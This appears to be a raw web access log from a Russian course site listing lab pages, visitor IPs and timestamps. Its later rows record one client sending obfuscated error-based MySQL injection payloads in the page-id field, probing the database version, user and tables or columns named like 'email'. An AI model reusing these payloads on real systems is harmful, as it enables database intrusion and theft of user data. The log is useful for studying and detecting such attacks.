2	Обработка строки запроса	85.140.3.145	2018-01-14 19:36:38.571676
1	Пример формы	85.140.3.145	2018-01-14 19:36:53.768005
2	Обработка строки запроса	85.140.3.145	2018-01-14 19:36:57.362475
9	ЛР(в базу, из базы)	136.169.211.77	2021-05-18	16:07:34
8	ЛР(в файл, из файла)	136.169.211.77	2021-05-18	16:09:53
1	Учет (в базу, из базы, обработка)	136.169.211.77	2021-05-18	16:12:28
9	ЛР(в базу, из базы)	136.169.211.77	2021-05-18	16:12:32
1	Учет (в базу, из базы, обработка)	136.169.211.77	2021-05-18	16:13:00
9	ЛР(в базу, из базы)	136.169.211.77	2021-05-18	16:15:24
9	ЛР(в базу, из базы)	136.169.211.77	2021-05-18	16:15:37
8	ЛР(в файл, из файла)	136.169.211.77	2021-05-18	16:22:12
8	ЛР(в файл, из файла)	136.169.211.77	2021-05-18	16:22:19
9	ЛР(в базу, из базы)	136.169.211.77	2021-05-18	16:22:45
9	ЛР(в базу, из базы)	136.169.211.77	2021-05-18	16:22:50
8	ЛР(в файл, из файла)	136.169.211.77	2021-05-18	16:24:30
9	ЛР(в базу, из базы)	136.169.211.77	2021-05-18	16:35:03
9	ЛР(в базу, из базы)	136.169.211.77	2021-05-18	16:35:06
1	Учет (в базу, из базы, обработка)	136.169.211.77	2021-05-18	16:35:49
2	Учет (в базу, из базы, анализ)	136.169.211.77	2021-05-18	16:51:37
1	Учет (в базу, из базы, обработка)	136.169.211.77	2021-05-18	16:51:49
2	Учет (в базу, из базы, анализ)	136.169.211.77	2021-05-18	16:51:58
1	Учет (в базу, из базы, обработка)	136.169.211.77	2021-05-18	16:52:27
9	ЛР(в базу, из базы)	136.169.211.77	2021-05-18	16:52:52
20	Тест	213.180.203.104	2021-05-18	17:29:21
7	МагазинОбработка 	141.8.142.81	2021-05-18	18:24:12
9	ЛР(в базу, из базы)	136.169.211.77	2021-05-18	18:32:56
1	Учет (в базу, из базы, обработка)	136.169.211.77	2021-05-18	18:38:42
6	Магазин	136.169.211.77	2021-05-18	18:46:31
6	Магазин	136.169.211.77	2021-05-18	18:46:44
20	Тест	5.255.231.173	2021-05-19	06:35:43
7	МагазинОбработка 	5.255.231.173	2021-05-19	07:16:24
3	ЛР(символы, строки)	66.181.161.96	2021-05-19	09:07:47
10	bash(очет)	66.181.161.96	2021-05-19	09:08:06
20	Тест	66.181.161.96	2021-05-19	09:08:10
4	CGI	66.181.161.96	2021-05-19	09:08:12
20	Тест	66.181.161.96	2021-05-19	09:08:43
20	Тест	66.181.161.96	2021-05-19	09:09:57
20	Тест	66.181.161.96	2021-05-19	09:13:53
4	CGI	66.181.161.96	2021-05-19	09:14:00
10	bash(очет)	66.181.161.96	2021-05-19	09:14:07
3	ЛР(символы, строки)	66.181.161.96	2021-05-19	09:14:12
6	Магазин	66.181.161.96	2021-05-19	09:14:16
5	Диаграммы	66.181.161.96	2021-05-19	09:14:24
4	CGI	66.181.161.96	2021-05-19	09:20:32
9	ЛР(в базу, из базы)	66.181.161.96	2021-05-19	09:20:39
6	Магазин	66.181.161.96	2021-05-19	09:20:54
5	Диаграммы	66.181.161.96	2021-05-19	09:20:58
20	Тест	176.59.112.221	2021-05-19	12:15:16
20	Тест	5.166.216.214	2021-05-19	13:51:37
20	Тест	195.211.23.206	2021-05-19	13:51:49
20	Тест	194.114.104.122	2021-05-19	15:36:31
4	CGI	194.114.104.122	2021-05-19	15:36:35
10	bash(очет)	194.114.104.122	2021-05-19	15:36:36
3	ЛР(символы, строки)	194.114.104.122	2021-05-19	15:36:38
8	ЛР(в файл, из файла)	194.114.104.122	2021-05-19	15:36:40
3	ЛР(символы, строки)	194.114.104.122	2021-05-19	15:36:42
8	ЛР(в файл, из файла)	194.114.104.122	2021-05-19	15:36:52
9	ЛР(в базу, из базы)	194.114.104.122	2021-05-19	15:36:55
1	Учет (в базу, из базы, обработка)	194.114.104.122	2021-05-19	15:37:32
6	Магазин	194.114.104.122	2021-05-19	15:37:35
5	Диаграммы	194.114.104.122	2021-05-19	15:37:38
5	Диаграммы	194.114.104.122	2021-05-19	15:37:47
5	Диаграммы	194.114.104.122	2021-05-19	15:37:51
5	Диаграммы	194.114.104.122	2021-05-19	15:38:06
5	Диаграммы	194.114.104.122	2021-05-19	15:38:11
5	Диаграммы	194.114.104.122	2021-05-19	15:38:15
5	Диаграммы	194.114.104.122	2021-05-19	15:38:15
5	Диаграммы	194.114.104.122	2021-05-19	15:38:15
5	Диаграммы	194.114.104.122	2021-05-19	15:38:15
5	Диаграммы	194.114.104.122	2021-05-19	15:38:18
5	Диаграммы	194.114.104.122	2021-05-19	15:38:29
5	Диаграммы	194.114.104.122	2021-05-19	15:38:33
5	Диаграммы	194.114.104.122	2021-05-19	15:38:39
5	Диаграммы	194.114.104.122	2021-05-19	15:38:43
5	Диаграммы	194.114.104.122	2021-05-19	15:38:47
20	Тест	37.147.202.109	2021-05-19	16:38:26
3	ЛР(символы, строки)	37.147.202.109	2021-05-19	16:38:31
20	Тест	37.147.202.109	2021-05-19	16:38:42
20	Тест	37.147.202.109	2021-05-19	16:38:54
10	bash(очет)	37.147.202.109	2021-05-19	16:38:57
20	Тест	37.147.202.109	2021-05-19	16:39:00
1	Учет (в базу, из базы, обработка)	37.147.202.109	2021-05-19	16:39:06
9	ЛР(в базу, из базы)	37.147.202.109	2021-05-19	16:39:09
5	Диаграммы	37.147.202.109	2021-05-19	16:39:26
10	bash(очет)	37.147.202.109	2021-05-19	16:39:42
5	Диаграммы	37.147.202.109	2021-05-19	16:40:39
20	Тест	37.147.202.109	2021-05-19	16:42:49
3	ЛР(символы, строки)	5.255.231.69	2021-05-21	02:05:47
4	CGI	217.138.220.174	2021-05-21	05:56:14
4	CGI	196.65.241.126	2021-05-21	16:42:10
4'A=0	CGI	196.65.241.126	2021-05-21	16:42:11
4	CGI	196.65.241.126	2021-05-21	16:43:12
4	CGI	196.65.241.126	2021-05-21	16:43:13
4	CGI	196.65.241.126	2021-05-21	16:43:16
4	CGI	196.65.241.126	2021-05-21	16:43:16
4 or 1='0=A and 1=1	CGI	196.65.241.126	2021-05-21	16:43:17
4 or 1=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/uNhEx(/**/hEx(/**/cOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21)))) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and 1=1	CGI	196.65.241.126	2021-05-21	16:43:18
4	CGI	196.65.241.126	2021-05-21	16:43:18
4 and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/uNhEx(/**/hEx(/**/cOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21)))) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and 1=1	CGI	196.65.241.126	2021-05-21	16:43:19
4	CGI	196.65.241.126	2021-05-21	16:43:20
4'(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/uNhEx(/**/hEx(/**/cOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21)))) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) '	CGI	196.65.241.126	2021-05-21	16:43:21
4	CGI	196.65.241.126	2021-05-21	16:43:22
4"(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/uNhEx(/**/hEx(/**/cOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21)))) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) "	CGI	196.65.241.126	2021-05-21	16:43:23
4	CGI	196.65.241.126	2021-05-21	16:43:24
4' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/uNhEx(/**/hEx(/**/cOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21)))) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1	CGI	196.65.241.126	2021-05-21	16:43:25
4' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/vErSiOn(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1	CGI	196.65.241.126	2021-05-21	16:43:26
4'0=A	CGI	196.65.241.126	2021-05-21	16:43:28
4' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/vErSiOn(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1	CGI	196.65.241.126	2021-05-21	16:45:33
4' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/uSeR(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1	CGI	196.65.241.126	2021-05-21	16:45:34
4' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/vErSiOn(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1	CGI	196.65.241.126	2021-05-21	16:45:35
4' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/vErSiOn(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1	CGI	196.65.241.126	2021-05-21	16:45:56
4' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/vErSiOn(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1	CGI	196.65.241.126	2021-05-21	16:45:57
4' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(t./**/tAbLe_nAmE),0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and c./**/cOlUmN_NaMe like 0x25656d61696c25)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1	CGI	196.65.241.126	2021-05-21	16:45:59
4' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/vErSiOn(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1	CGI	196.65.241.126	2021-05-21	16:46:12
4' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/vErSiOn(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1	CGI	196.65.241.126	2021-05-21	16:46:13
4' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(t./**/tAbLe_nAmE),0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and c./**/cOlUmN_NaMe like 0x25656d61696c25)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1	CGI	196.65.241.126	2021-05-21	16:46:13
4' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/vErSiOn(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1	CGI	196.65.241.126	2021-05-21	16:46:41
4' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/vErSiOn(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1	CGI	196.65.241.126	2021-05-21	16:46:42
4' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(t./**/tAbLe_nAmE),0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and t./**/tAbLe_nAmE like 0x25656d61696c25)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1	CGI	196.65.241.126	2021-05-21	16:46:43
4' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/vErSiOn(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1	CGI	196.65.241.126	2021-05-21	16:46:58
4' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/vErSiOn(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1	CGI	196.65.241.126	2021-05-21	16:46:59
4' and(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(t./**/tAbLe_nAmE),0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and t./**/tAbLe_nAmE like 0x25656d61696c25)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a) and '1'='1	CGI	196.65.241.126	2021-05-21	16:47:00
